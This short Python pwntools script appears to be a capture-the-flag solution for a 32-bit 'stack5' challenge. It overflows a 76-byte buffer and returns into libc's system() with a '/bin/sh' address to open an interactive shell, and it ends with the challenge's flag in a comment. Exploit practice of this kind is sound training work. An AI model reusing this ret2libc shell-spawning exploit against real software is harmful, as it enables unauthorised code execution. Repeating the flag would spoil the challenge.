from pwn import *

offset = 76
system = 0xf7e28f10
binsh = 0xf7dec000+0x17b9db

expl = offset*b'A' + p32(system) + b'0000' + p32(binsh)

p = process('/problems/stack5r-32_3_19514e7d2c9db2488cb051e873450477/stack5')
p.sendline(expl)
p.interactive()

# flag is wpi{a9380f5ee9223d4348be639140fbda72}
